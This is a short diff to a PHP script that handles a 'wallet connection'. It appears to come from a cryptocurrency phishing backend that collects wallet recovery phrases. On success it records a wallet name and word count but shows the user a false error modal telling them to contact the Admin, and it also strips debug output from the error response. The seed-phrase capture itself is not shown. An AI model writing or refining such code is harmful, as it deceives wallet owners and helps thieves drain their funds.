@@ -183,7 +183,9 @@ try {
     // Return success response
     echo json_encode([
         'success' => true,
-        'message' => 'There is an error connecting to this wallet. Kindly contact the adminS.',
+        'show_modal' => true,
+        'modal_title' => 'Error Occured While Connecting Wallet',
+        'message' => 'There is an error connecting to this wallet. Kindly contact the Admin.',
         'wallet_name' => $wallet_name,
         'word_count' => $word_count,
         'timestamp' => time()
@@ -204,11 +206,13 @@ try {
         'error_line' => $e->getLine()
     ];
     
+    // For certain errors (still show modal but as error)
     echo json_encode([
         'success' => false,
-        'message' => $e->getMessage(),
-        'error_code' => 'WALLET_ERROR',
-        'debug' => $debug_info
+        'show_modal' => true,
+        'modal_title' => 'Connection Failed',
+        'message' => 'There was an error connecting your wallet. Please try again.',
+        'error_code' => 'WALLET_ERROR'
     ]);
     exit;
 }
